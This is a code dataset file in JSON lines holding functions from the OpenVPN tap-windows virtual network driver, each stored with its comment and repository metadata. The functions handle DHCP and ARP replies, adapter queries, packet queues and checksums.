{"docstring": "//===================\n// DHCP message tests\n//===================\n", "func_signal": "int\nGetDHCPMessageType (const DHCP *dhcp, const int optlen)", "code": "{\n  const UCHAR *p = (UCHAR *) (dhcp + 1);\n  int i;\n\n  for (i = 0; i < optlen; ++i)\n    {\n      const UCHAR type = p[i];\n      const int room = optlen - i - 1;\n      if (type == DHCP_END)           // didn't find what we were looking for\n\treturn -1;\n      else if (type == DHCP_PAD)      // no-operation\n\t;\n      else if (type == DHCP_MSG_TYPE) // what we are looking for\n\t{\n\t  if (room >= 2)\n\t    {\n\t      if (p[i+1] == 1)        // message length should be 1\n\t\treturn p[i+2];        // return message type\n\t    }\n\t  return -1;\n\t}\n      else                            // some other message\n\t{\n\t  if (room >= 1)\n\t    {\n\t      const int len = p[i+1]; // get message length\n\t      i += (len + 1);         // advance to next message\n\t    }\n\t}\n    }\n  return -1;\n}", "path": "src\\dhcp.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//==============================================================\n//                  Adapter Option Query/Modification\n//==============================================================\n", "func_signal": "NDIS_STATUS AdapterQuery\n(IN NDIS_HANDLE p_AdapterContext,\n IN NDIS_OID p_OID,\n IN PVOID p_Buffer,\n IN ULONG p_BufferLength,\n OUT PULONG p_BytesWritten, OUT PULONG p_BytesNeeded)", "code": "{\n  TapAdapterPointer l_Adapter = (TapAdapterPointer) p_AdapterContext;\n  TapAdapterQuery l_Query, *l_QueryPtr = &l_Query;\n  NDIS_STATUS l_Status = NDIS_STATUS_SUCCESS;\n  UINT l_QueryLength = 4;\n  BOOLEAN lock_succeeded;\n\n  NdisZeroMemory (&l_Query, sizeof (l_Query));\n\n  switch (p_OID)\n    {\n      //===================================================================\n      //                       Vendor & Driver version Info\n      //===================================================================\n    case OID_GEN_VENDOR_DESCRIPTION:\n      l_QueryPtr = (TapAdapterQueryPointer) PRODUCT_TAP_WIN_DEVICE_DESCRIPTION;\n      l_QueryLength = strlen (PRODUCT_TAP_WIN_DEVICE_DESCRIPTION) + 1;\n      break;\n\n    case OID_GEN_VENDOR_ID:\n      l_Query.m_Long = 0xffffff;\n      break;\n\n    case OID_GEN_DRIVER_VERSION:\n      l_Query.m_Short =\n\t(((USHORT) TAP_NDIS_MAJOR_VERSION) << 8 | (USHORT)\n\t TAP_NDIS_MINOR_VERSION);\n      l_QueryLength = sizeof (unsigned short);\n      break;\n\n    case OID_GEN_VENDOR_DRIVER_VERSION:\n      l_Query.m_Long =\n\t(((USHORT) PRODUCT_TAP_WIN_MAJOR) << 8 | (USHORT)\n\t PRODUCT_TAP_WIN_MINOR);\n      break;\n\n      //=================================================================\n      //                             Statistics\n      //=================================================================\n    case OID_GEN_RCV_NO_BUFFER:\n      l_Query.m_Long = 0;\n      break;\n\n    case OID_802_3_RCV_ERROR_ALIGNMENT:\n      l_Query.m_Long = 0;\n      break;\n\n    case OID_802_3_XMIT_ONE_COLLISION:\n      l_Query.m_Long = 0;\n      break;\n\n    case OID_802_3_XMIT_MORE_COLLISIONS:\n      l_Query.m_Long = 0;\n      break;\n\n    case OID_GEN_XMIT_OK:\n      l_Query.m_Long = l_Adapter->m_Tx;\n      break;\n\n    case OID_GEN_RCV_OK:\n      l_Query.m_Long = l_Adapter->m_Rx;\n      break;\n\n    case OID_GEN_XMIT_ERROR:\n      l_Query.m_Long = l_Adapter->m_TxErr;\n      break;\n\n    case OID_GEN_RCV_ERROR:\n      l_Query.m_Long = l_Adapter->m_RxErr;\n      break;\n\n      //===================================================================\n      //                       Device & Protocol Options\n      //===================================================================\n    case OID_GEN_SUPPORTED_LIST:\n      l_QueryPtr = (TapAdapterQueryPointer) g_SupportedOIDList;\n      l_QueryLength = sizeof (g_SupportedOIDList);\n      break;\n\n    case OID_GEN_MAC_OPTIONS:\n      // This MUST be here !!!\n      l_Query.m_Long = (NDIS_MAC_OPTION_RECEIVE_SERIALIZED\n\t\t\t| NDIS_MAC_OPTION_COPY_LOOKAHEAD_DATA\n\t\t\t| NDIS_MAC_OPTION_NO_LOOPBACK\n\t\t\t| NDIS_MAC_OPTION_TRANSFERS_NOT_PEND);\n\n      break;\n\n    case OID_GEN_CURRENT_PACKET_FILTER:\n      l_Query.m_Long =\n\t(NDIS_PACKET_TYPE_ALL_LOCAL |\n\t NDIS_PACKET_TYPE_BROADCAST |\n\t NDIS_PACKET_TYPE_DIRECTED | NDIS_PACKET_TYPE_ALL_FUNCTIONAL);\n\n      break;\n\n    case OID_GEN_PROTOCOL_OPTIONS:\n      l_Query.m_Long = 0;\n      break;\n\n      //==================================================================\n      //                            Device Info\n      //==================================================================\n    case OID_GEN_MEDIA_CONNECT_STATUS:\n      l_Query.m_Long = l_Adapter->m_MediaState\n\t? NdisMediaStateConnected : NdisMediaStateDisconnected;\n      break;\n\n    case OID_GEN_HARDWARE_STATUS:\n      l_Query.m_HardwareStatus = NdisHardwareStatusReady;\n      l_QueryLength = sizeof (NDIS_HARDWARE_STATUS);\n      break;\n\n    case OID_GEN_MEDIA_SUPPORTED:\n    case OID_GEN_MEDIA_IN_USE:\n      l_Query.m_Medium = l_Adapter->m_Medium;\n      l_QueryLength = sizeof (NDIS_MEDIUM);\n      break;\n\n    case OID_GEN_PHYSICAL_MEDIUM:\n      l_Query.m_PhysicalMedium = NdisPhysicalMediumUnspecified;\n      l_QueryLength = sizeof (NDIS_PHYSICAL_MEDIUM);\n      break;\n      \n    case OID_GEN_LINK_SPEED:\n      l_Query.m_Long = 100000; // rate / 100 bps\n      break;\n\n    case OID_802_3_PERMANENT_ADDRESS:\n    case OID_802_3_CURRENT_ADDRESS:\n      COPY_MAC (l_Query.m_MacAddress, l_Adapter->m_MAC);\n      l_QueryLength = sizeof (MACADDR);\n      break;\n\n      //==================================================================\n      //                             Limits\n      //==================================================================\n\n    case OID_GEN_MAXIMUM_SEND_PACKETS:\n      l_Query.m_Long = 1;\n      break;\n\n    case OID_802_3_MAXIMUM_LIST_SIZE:\n      l_Query.m_Long = NIC_MAX_MCAST_LIST;\n      break;\n\n    case OID_GEN_CURRENT_LOOKAHEAD:\n      l_Query.m_Long = l_Adapter->m_Lookahead;\n      break;\n\n    case OID_GEN_MAXIMUM_LOOKAHEAD:\n    case OID_GEN_MAXIMUM_TOTAL_SIZE:\n    case OID_GEN_RECEIVE_BUFFER_SPACE:\n    case OID_GEN_RECEIVE_BLOCK_SIZE:\n      l_Query.m_Long = DEFAULT_PACKET_LOOKAHEAD;\n      break;\n\n    case OID_GEN_MAXIMUM_FRAME_SIZE:\n    case OID_GEN_TRANSMIT_BLOCK_SIZE:\n    case OID_GEN_TRANSMIT_BUFFER_SPACE:\n      l_Query.m_Long = l_Adapter->m_MTU;\n      break;\n\n    case OID_PNP_CAPABILITIES:\n      do\n\t{\n\t  PNDIS_PNP_CAPABILITIES pPNPCapabilities;\n\t  PNDIS_PM_WAKE_UP_CAPABILITIES pPMstruct;\n\n\t  if (p_BufferLength >= sizeof (NDIS_PNP_CAPABILITIES))\n\t    {\n\t      pPNPCapabilities = (PNDIS_PNP_CAPABILITIES) (p_Buffer);\n\n\t      //\n\t      // Setting up the buffer to be returned\n\t      // to the Protocol above the Passthru miniport\n\t      //\n\t      pPMstruct = &pPNPCapabilities->WakeUpCapabilities;\n\t      pPMstruct->MinMagicPacketWakeUp = NdisDeviceStateUnspecified;\n\t      pPMstruct->MinPatternWakeUp = NdisDeviceStateUnspecified;\n\t      pPMstruct->MinLinkChangeWakeUp = NdisDeviceStateUnspecified;\n\t    }\n\t  l_QueryLength = sizeof (NDIS_PNP_CAPABILITIES);\n\t}\n      while (FALSE);\n      break;\n    case OID_PNP_QUERY_POWER:\n      break;\n\n      // Required OIDs that we don't support\n\n    case OID_GEN_SUPPORTED_GUIDS:\n    case OID_GEN_MEDIA_CAPABILITIES:\n    case OID_TCP_TASK_OFFLOAD:\n    case OID_FFP_SUPPORT:\n      l_Status = NDIS_STATUS_INVALID_OID;\n      break;\n\n      // Optional stats OIDs\n\n    case OID_GEN_DIRECTED_BYTES_XMIT:\n    case OID_GEN_DIRECTED_FRAMES_XMIT:\n    case OID_GEN_MULTICAST_BYTES_XMIT:\n    case OID_GEN_MULTICAST_FRAMES_XMIT:\n    case OID_GEN_BROADCAST_BYTES_XMIT:\n    case OID_GEN_BROADCAST_FRAMES_XMIT:\n    case OID_GEN_DIRECTED_BYTES_RCV:\n    case OID_GEN_DIRECTED_FRAMES_RCV:\n    case OID_GEN_MULTICAST_BYTES_RCV:\n    case OID_GEN_MULTICAST_FRAMES_RCV:\n    case OID_GEN_BROADCAST_BYTES_RCV:\n    case OID_GEN_BROADCAST_FRAMES_RCV:\n      l_Status = NDIS_STATUS_INVALID_OID;\n      break;\n\n      //===================================================================\n      //                          Not Handled\n      //===================================================================\n    default:\n      DEBUGP ((\"[%s] Unhandled OID %lx\\n\", NAME (l_Adapter), p_OID));\n      l_Status = NDIS_STATUS_INVALID_OID;\n      break;\n    }\n\n  if (l_Status != NDIS_STATUS_SUCCESS)\n    ;\n  else if (l_QueryLength > p_BufferLength)\n    {\n      l_Status = NDIS_STATUS_INVALID_LENGTH;\n      *p_BytesNeeded = l_QueryLength;\n    }\n  else\n    NdisMoveMemory (p_Buffer, (PVOID) l_QueryPtr,\n\t\t    (*p_BytesWritten = l_QueryLength));\n\n  return l_Status;\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//===================================================================\n// Handle a BOOTPS packet produced by the local system to\n// resolve the address/netmask of this adapter.\n// If we are in TAP_WIN_IOCTL_CONFIG_DHCP_MASQ mode, reply\n// to the message.  Return TRUE if we processed the passed\n// message, so that downstream stages can ignore it.\n//===================================================================\n", "func_signal": "BOOLEAN\nProcessDHCP (TapAdapterPointer p_Adapter,\n\t     const ETH_HEADER *eth,\n\t     const IPHDR *ip,\n\t     const UDPHDR *udp,\n\t     const DHCP *dhcp,\n\t     int optlen)", "code": "{\n  int msg_type;\n\n  // Sanity check IP header\n  if (!(ntohs (ip->tot_len) == sizeof (IPHDR) + sizeof (UDPHDR) + sizeof (DHCP) + optlen\n\t&& (ntohs (ip->frag_off) & IP_OFFMASK) == 0))\n    return TRUE;\n\n  // Does this message belong to us?\n  if (!DHCPMessageOurs (p_Adapter, eth, ip, udp, dhcp))\n    return FALSE;\n\n  msg_type = GetDHCPMessageType (dhcp, optlen);\n\n  // Drop non-BOOTREQUEST messages\n  if (dhcp->op != BOOTREQUEST)\n    return TRUE;\n\n  // Drop any messages except DHCPDISCOVER or DHCPREQUEST\n  if (!(msg_type == DHCPDISCOVER || msg_type == DHCPREQUEST))\n    return TRUE;\n\n  // Should we reply with DHCPOFFER, DHCPACK, or DHCPNAK?\n  if (msg_type == DHCPREQUEST\n      && ((dhcp->ciaddr && dhcp->ciaddr != p_Adapter->m_dhcp_addr)\n\t  || !p_Adapter->m_dhcp_received_discover\n\t  || p_Adapter->m_dhcp_bad_requests >= BAD_DHCPREQUEST_NAK_THRESHOLD))\n    SendDHCPMsg (p_Adapter,\n\t\t DHCPNAK,\n\t\t eth, ip, udp, dhcp);\n  else\n    SendDHCPMsg (p_Adapter,\n\t\t (msg_type == DHCPDISCOVER ? DHCPOFFER : DHCPACK),\n\t\t eth, ip, udp, dhcp);\n\n  // Remember if we received a DHCPDISCOVER\n  if (msg_type == DHCPDISCOVER)\n    p_Adapter->m_dhcp_received_discover = TRUE;\n\n  // Is this a bad DHCPREQUEST?\n  if (msg_type == DHCPREQUEST && dhcp->ciaddr && dhcp->ciaddr != p_Adapter->m_dhcp_addr)\n    ++p_Adapter->m_dhcp_bad_requests;\n\n  return TRUE;\n}", "path": "src\\dhcp.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "// Do packet injection now\n", "func_signal": "VOID\nInjectPacketNow (TapAdapterPointer p_Adapter,\n\t\t UCHAR *packet,\n\t\t const unsigned int len)", "code": "{\n  MYASSERT (len >= ETHERNET_HEADER_SIZE);\n\n  __try\n    {\n      //------------------------------------------------------------\n      // NdisMEthIndicateReceive and NdisMEthIndicateReceiveComplete\n      // could potentially be called reentrantly both here and in\n      // TapDeviceHook/IRP_MJ_WRITE.\n      //\n      // The DDK docs imply that this is okay.\n      //\n      // Note that reentrant behavior could only occur if the\n      // non-deferred version of InjectPacket is used.\n      //------------------------------------------------------------\n      NdisMEthIndicateReceive\n\t(p_Adapter->m_MiniportAdapterHandle,\n\t (NDIS_HANDLE) p_Adapter,\n\t packet,\n\t ETHERNET_HEADER_SIZE,\n\t packet + ETHERNET_HEADER_SIZE,\n\t len - ETHERNET_HEADER_SIZE,\n\t len - ETHERNET_HEADER_SIZE);\n      \n      NdisMEthIndicateReceiveComplete (p_Adapter->m_MiniportAdapterHandle);\n    }\n  __except (EXCEPTION_EXECUTE_HANDLER)\n    {\n      DEBUGP ((\"[%s] NdisMEthIndicateReceive failed in InjectPacketNow\\n\",\n\t       NAME (p_Adapter)));\n      NOTE_ERROR ();\n    }\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//========================================================\n//                      Adapter Control\n//========================================================\n", "func_signal": "NDIS_STATUS\nAdapterReset (OUT PBOOLEAN p_AddressingReset, IN NDIS_HANDLE p_AdapterContext)", "code": "{\n  TapAdapterPointer l_Adapter = (TapAdapterPointer) p_AdapterContext;\n  DEBUGP ((\"[%s] is resetting\\n\", NAME (l_Adapter)));\n  return NDIS_STATUS_SUCCESS;\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//=========================\n// Code to set DHCP options\n//=========================\n", "func_signal": "VOID\nSetDHCPOpt (DHCPMsg *m, void *data, unsigned int len)", "code": "{\n  if (!m->overflow)\n    {\n      if (m->optlen + len <= DHCP_OPTIONS_BUFFER_SIZE)\n\t{\n\t  if (len)\n\t    {\n\t      NdisMoveMemory (m->msg.options + m->optlen, data, len);\n\t      m->optlen += len;\n\t    }\n\t}\n      else\n\t{\n\t  m->overflow = TRUE;\n\t}\n    }\n}", "path": "src\\dhcp.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//===================================================\n// Generate an ARP reply message for specific kinds\n// ARP queries.\n//===================================================\n", "func_signal": "BOOLEAN\nProcessARP (TapAdapterPointer p_Adapter,\n\t    const PARP_PACKET src,\n\t    const IPADDR adapter_ip,\n\t    const IPADDR ip_network,\n\t    const IPADDR ip_netmask,\n\t    const MACADDR mac)", "code": "{\n  //-----------------------------------------------\n  // Is this the kind of packet we are looking for?\n  //-----------------------------------------------\n  if (src->m_Proto == htons (ETH_P_ARP)\n      && MAC_EQUAL (src->m_MAC_Source, p_Adapter->m_MAC)\n      && MAC_EQUAL (src->m_ARP_MAC_Source, p_Adapter->m_MAC)\n      && MAC_EQUAL (src->m_MAC_Destination, p_Adapter->m_MAC_Broadcast)\n      && src->m_ARP_Operation == htons (ARP_REQUEST)\n      && src->m_MAC_AddressType == htons (MAC_ADDR_TYPE)\n      && src->m_MAC_AddressSize == sizeof (MACADDR)\n      && src->m_PROTO_AddressType == htons (ETH_P_IP)\n      && src->m_PROTO_AddressSize == sizeof (IPADDR)\n      && src->m_ARP_IP_Source == adapter_ip\n      && (src->m_ARP_IP_Destination & ip_netmask) == ip_network\n      && src->m_ARP_IP_Destination != adapter_ip)\n    {\n      ARP_PACKET *arp = (ARP_PACKET *) MemAlloc (sizeof (ARP_PACKET), TRUE);\n      if (arp)\n\t{\n\t  //----------------------------------------------\n\t  // Initialize ARP reply fields\n\t  //----------------------------------------------\n\t  arp->m_Proto = htons (ETH_P_ARP);\n\t  arp->m_MAC_AddressType = htons (MAC_ADDR_TYPE);\n\t  arp->m_PROTO_AddressType = htons (ETH_P_IP);\n\t  arp->m_MAC_AddressSize = sizeof (MACADDR);\n\t  arp->m_PROTO_AddressSize = sizeof (IPADDR);\n\t  arp->m_ARP_Operation = htons (ARP_REPLY);\n\n\t  //----------------------------------------------\n\t  // ARP addresses\n\t  //----------------------------------------------      \n\t  COPY_MAC (arp->m_MAC_Source, mac);\n\t  COPY_MAC (arp->m_MAC_Destination, p_Adapter->m_MAC);\n\t  COPY_MAC (arp->m_ARP_MAC_Source, mac);\n\t  COPY_MAC (arp->m_ARP_MAC_Destination, p_Adapter->m_MAC);\n\t  arp->m_ARP_IP_Source = src->m_ARP_IP_Destination;\n\t  arp->m_ARP_IP_Destination = adapter_ip;\n\n\t  DUMP_PACKET (\"ProcessARP\",\n\t\t       (unsigned char *) arp,\n\t\t       sizeof (ARP_PACKET));\n\n\t  InjectPacketDeferred (p_Adapter, (UCHAR *) arp, sizeof (ARP_PACKET));\n\n\t  MemFree (arp, sizeof (ARP_PACKET));\n\t}\n\n      return TRUE;\n    }\n  else\n    return FALSE;\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//------------------\n// Memory Management\n//------------------\n", "func_signal": "PVOID\nMemAlloc (ULONG p_Size, BOOLEAN zero)", "code": "{\n  PVOID l_Return = NULL;\n\n  if (p_Size)\n    {\n      __try\n      {\n\tif (NdisAllocateMemoryWithTag (&l_Return, p_Size, 'APAT')\n\t    == NDIS_STATUS_SUCCESS)\n\t  {\n\t    if (zero)\n\t      NdisZeroMemory (l_Return, p_Size);\n\t  }\n\telse\n\t  l_Return = NULL;\n      }\n      __except (EXCEPTION_EXECUTE_HANDLER)\n      {\n\tl_Return = NULL;\n      }\n    }\n\n  return l_Return;\n}", "path": "src\\mem.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "// Defer packet injection till IRQL < DISPATCH_LEVEL\n", "func_signal": "VOID\nInjectPacketDeferred (TapAdapterPointer p_Adapter,\n\t\t      UCHAR *packet,\n\t\t      const unsigned int len)", "code": "{\n  InjectPacketPointer l_InjectBuffer;\n  PVOID result;\n\n  if (NdisAllocateMemoryWithTag (&l_InjectBuffer,\n\t\t\t\t INJECT_PACKET_SIZE (len),\n\t\t\t\t 'IPAT') == NDIS_STATUS_SUCCESS)\n    {\n      l_InjectBuffer->m_Size = len;\n      NdisMoveMemory (l_InjectBuffer->m_Data, packet, len);\n      NdisAcquireSpinLock (&p_Adapter->m_Extension.m_InjectLock);\n      result = QueuePush (p_Adapter->m_Extension.m_InjectQueue, l_InjectBuffer);\n      NdisReleaseSpinLock (&p_Adapter->m_Extension.m_InjectLock);\n      if (result)\n\tKeInsertQueueDpc (&p_Adapter->m_Extension.m_InjectDpc, p_Adapter, NULL);\n      else\n\tINJECT_PACKET_FREE(l_InjectBuffer);\n    }\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//===================================================================\n// Go back to default TAP mode from Point-To-Point mode.\n// Also reset (i.e. disable) DHCP Masq mode.\n//===================================================================\n", "func_signal": "VOID ResetTapAdapterState (TapAdapterPointer p_Adapter)", "code": "{\n  // Point-To-Point\n  p_Adapter->m_tun = FALSE;\n  p_Adapter->m_localIP = 0;\n  p_Adapter->m_remoteNetwork = 0;\n  p_Adapter->m_remoteNetmask = 0;\n  NdisZeroMemory (&p_Adapter->m_TapToUser, sizeof (p_Adapter->m_TapToUser));\n  NdisZeroMemory (&p_Adapter->m_UserToTap, sizeof (p_Adapter->m_UserToTap));\n  NdisZeroMemory (&p_Adapter->m_UserToTap_IPv6, sizeof (p_Adapter->m_UserToTap_IPv6));\n\n  // DHCP Masq\n  p_Adapter->m_dhcp_enabled = FALSE;\n  p_Adapter->m_dhcp_server_arp = FALSE;\n  p_Adapter->m_dhcp_user_supplied_options_buffer_len = 0;\n  p_Adapter->m_dhcp_addr = 0;\n  p_Adapter->m_dhcp_netmask = 0;\n  p_Adapter->m_dhcp_server_ip = 0;\n  p_Adapter->m_dhcp_lease_time = 0;\n  p_Adapter->m_dhcp_received_discover = FALSE;\n  p_Adapter->m_dhcp_bad_requests = 0;\n  NdisZeroMemory (p_Adapter->m_dhcp_server_mac, sizeof (MACADDR));\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//=============================================================\n// CompleteIRP is normally called with an adapter -> userspace\n// network packet and an IRP (Pending I/O request) from userspace.\n//\n// The IRP will normally represent a queued overlapped read\n// operation from userspace that is in a wait state.\n//\n// Use the ethernet packet to satisfy the IRP.\n//=============================================================\n", "func_signal": "NTSTATUS\nCompleteIRP (IN PIRP p_IRP,\n\t     IN TapPacketPointer p_PacketBuffer,\n\t     IN CCHAR PriorityBoost)", "code": "{\n  NTSTATUS l_Status = STATUS_UNSUCCESSFUL;\n\n  int offset;\n  int len;\n\n  MYASSERT (p_IRP);\n  MYASSERT (p_PacketBuffer);\n\n  IoSetCancelRoutine (p_IRP, NULL);  // Disable cancel routine\n\n  //-------------------------------------------\n  // While p_PacketBuffer always contains a\n  // full ethernet packet, including the\n  // ethernet header, in point-to-point mode,\n  // we only want to return the IPv4\n  // component.\n  //-------------------------------------------\n\n  if (p_PacketBuffer->m_SizeFlags & TP_TUN)\n    {\n      offset = ETHERNET_HEADER_SIZE;\n      len = (int) (p_PacketBuffer->m_SizeFlags & TP_SIZE_MASK) - ETHERNET_HEADER_SIZE;\n    }\n  else\n    {\n      offset = 0;\n      len = (p_PacketBuffer->m_SizeFlags & TP_SIZE_MASK);\n    }\n\n  if (len < 0 || (int) p_IRP->IoStatus.Information < len)\n    {\n      p_IRP->IoStatus.Information = 0;\n      p_IRP->IoStatus.Status = STATUS_BUFFER_OVERFLOW;\n      NOTE_ERROR ();\n    }\n  else\n    {\n      p_IRP->IoStatus.Information = len;\n      p_IRP->IoStatus.Status = l_Status = STATUS_SUCCESS;\n\n      __try\n\t{\n\t  NdisMoveMemory (p_IRP->AssociatedIrp.SystemBuffer,\n\t\t\t  p_PacketBuffer->m_Data + offset,\n\t\t\t  len);\n\t}\n      __except (EXCEPTION_EXECUTE_HANDLER)\n\t{\n\t  NOTE_ERROR ();\n\t  p_IRP->IoStatus.Status = STATUS_UNSUCCESSFUL;\n\t  p_IRP->IoStatus.Information = 0;\n\t}\n    }\n\n  __try\n    {\n      NdisFreeMemory (p_PacketBuffer,\n\t\t      TAP_PACKET_SIZE (p_PacketBuffer->m_SizeFlags & TP_SIZE_MASK),\n\t\t      0);\n    }\n  __except (EXCEPTION_EXECUTE_HANDLER)\n    {\n    }\n  \n  if (l_Status == STATUS_SUCCESS)\n    {\n      IoCompleteRequest (p_IRP, PriorityBoost);\n    }\n  else\n    IoCompleteRequest (p_IRP, IO_NO_INCREMENT);\n\n  return l_Status;\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//===================================================\n// Tell Windows whether the TAP device should be\n// considered \"connected\" or \"disconnected\".\n//===================================================\n", "func_signal": "VOID\nSetMediaStatus (TapAdapterPointer p_Adapter, BOOLEAN state)", "code": "{\n  if (p_Adapter->m_MediaState != state && !p_Adapter->m_MediaStateAlwaysConnected)\n    {\n      if (state)\n\tNdisMIndicateStatus (p_Adapter->m_MiniportAdapterHandle,\n\t\t\t     NDIS_STATUS_MEDIA_CONNECT, NULL, 0);\n      else\n\tNdisMIndicateStatus (p_Adapter->m_MiniportAdapterHandle,\n\t\t\t     NDIS_STATUS_MEDIA_DISCONNECT, NULL, 0);\n\n      NdisMIndicateStatusComplete (p_Adapter->m_MiniportAdapterHandle);\n      p_Adapter->m_MediaState = state;\n    }\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "// Handle the injection of previously deferred packets\n", "func_signal": "VOID\nInjectPacketDpc(KDPC *Dpc,\n\t\tPVOID DeferredContext,\n\t\tPVOID SystemArgument1,\n\t\tPVOID SystemArgument2)", "code": "{\n  InjectPacketPointer l_InjectBuffer;\n  TapAdapterPointer l_Adapter = (TapAdapterPointer)SystemArgument1;\n  while (TRUE)\n    {\n      NdisAcquireSpinLock (&l_Adapter->m_Extension.m_InjectLock);\n      l_InjectBuffer = QueuePop (l_Adapter->m_Extension.m_InjectQueue);\n      NdisReleaseSpinLock (&l_Adapter->m_Extension.m_InjectLock);\n      if (l_InjectBuffer)\n\t{\n\t  InjectPacketNow(l_Adapter, l_InjectBuffer->m_Data, l_InjectBuffer->m_Size);\n\t  INJECT_PACKET_FREE(l_InjectBuffer);\n\t}\n      else\n\tbreak;\n    }\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//==============\n// Checksum code\n//==============\n", "func_signal": "USHORT\nip_checksum (const UCHAR *buf, const int len_ip_header)", "code": "{\n  USHORT word16;\n  ULONG sum = 0;\n  int i;\n    \n  // make 16 bit words out of every two adjacent 8 bit words in the packet\n  // and add them up\n  for (i = 0; i < len_ip_header - 1; i += 2) {\n    word16 = ((buf[i] << 8) & 0xFF00) + (buf[i+1] & 0xFF);\n    sum += (ULONG) word16;\n  }\n\n  // take only 16 bits out of the 32 bit sum and add up the carries\n  while (sum >> 16)\n    sum = (sum & 0xFFFF) + (sum >> 16);\n\n  // one's complement the result\n  return ((USHORT) ~sum);\n}", "path": "src\\dhcp.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//===========================================\n// Exhaust packet, IRP, and injection queues.\n//===========================================\n", "func_signal": "VOID\nFlushQueues (TapExtensionPointer p_Extension)", "code": "{\n  PIRP l_IRP;\n  TapPacketPointer l_PacketBuffer;\n  InjectPacketPointer l_InjectBuffer;\n  int n_IRP=0, n_Packet=0, n_Inject=0;\n\n  MYASSERT (p_Extension);\n  MYASSERT (p_Extension->m_TapDevice);\n\n  while (TRUE)\n    {\n      NdisAcquireSpinLock (&p_Extension->m_QueueLock);\n      l_IRP = QueuePop (p_Extension->m_IrpQueue);\n      NdisReleaseSpinLock (&p_Extension->m_QueueLock);\n      if (l_IRP)\n\t{\n\t  ++n_IRP;\n\t  CancelIRP (NULL, l_IRP, FALSE);\n\t}\n      else\n\tbreak;\n    }\n\n  while (TRUE)\n    {\n      NdisAcquireSpinLock (&p_Extension->m_QueueLock);\n      l_PacketBuffer = QueuePop (p_Extension->m_PacketQueue);\n      NdisReleaseSpinLock (&p_Extension->m_QueueLock);\n      if (l_PacketBuffer)\n\t{\n\t  ++n_Packet;\n\t  MemFree (l_PacketBuffer, TAP_PACKET_SIZE (l_PacketBuffer->m_SizeFlags & TP_SIZE_MASK));\n\t}\n      else\n\tbreak;\n    }\n\n  while (TRUE)\n    {\n      NdisAcquireSpinLock (&p_Extension->m_InjectLock);\n      l_InjectBuffer = QueuePop (p_Extension->m_InjectQueue);\n      NdisReleaseSpinLock (&p_Extension->m_InjectLock);\n      if (l_InjectBuffer)\n\t{\n\t  ++n_Inject;\n\t  INJECT_PACKET_FREE(l_InjectBuffer);\n\t}\n      else\n\tbreak;\n    }\n\n  DEBUGP ((\n\t   \"[%s] [TAP] FlushQueues n_IRP=[%d,%d,%d] n_Packet=[%d,%d,%d] n_Inject=[%d,%d,%d]\\n\",\n\t   p_Extension->m_TapName,\n\t   n_IRP,\n\t   p_Extension->m_IrpQueue->max_size,\n\t   IRP_QUEUE_SIZE,\n\t   n_Packet,\n\t   p_Extension->m_PacketQueue->max_size,\n\t   PACKET_QUEUE_SIZE,\n\t   n_Inject,\n\t   p_Extension->m_InjectQueue->max_size,\n\t   INJECT_QUEUE_SIZE\n\t   ));\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "// checksum code for ICMPv6 packet, taken from dhcp.c / udp_checksum\n// see RFC 4443, 2.3, and RFC 2460, 8.1\n", "func_signal": "USHORT\nicmpv6_checksum (const UCHAR *buf,\n\t         const int len_icmpv6,\n\t         const UCHAR *saddr6,\n\t         const UCHAR *daddr6)", "code": "{\n  USHORT word16;\n  ULONG sum = 0;\n  int i;\n\n  // make 16 bit words out of every two adjacent 8 bit words and\n  // calculate the sum of all 16 bit words\n  for (i = 0; i < len_icmpv6; i += 2){\n    word16 = ((buf[i] << 8) & 0xFF00) + ((i + 1 < len_icmpv6) ? (buf[i+1] & 0xFF) : 0);\n    sum += word16;\n  }\n\n  // add the IPv6 pseudo header which contains the IP source and destination addresses\n  for (i = 0; i < 16; i += 2){\n    word16 =((saddr6[i] << 8) & 0xFF00) + (saddr6[i+1] & 0xFF);\n    sum += word16;\n  }\n  for (i = 0; i < 16; i += 2){\n    word16 =((daddr6[i] << 8) & 0xFF00) + (daddr6[i+1] & 0xFF);\n    sum += word16;\n  }\n\n  // the next-header number and the length of the ICMPv6 packet\n  sum += (USHORT) IPPROTO_ICMPV6 + (USHORT) len_icmpv6;\n\n  // keep only the last 16 bits of the 32 bit calculated sum and add the carries\n  while (sum >> 16)\n    sum = (sum & 0xFFFF) + (sum >> 16);\n\n  // Take the one's complement of sum\n  return ((USHORT) ~sum);\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
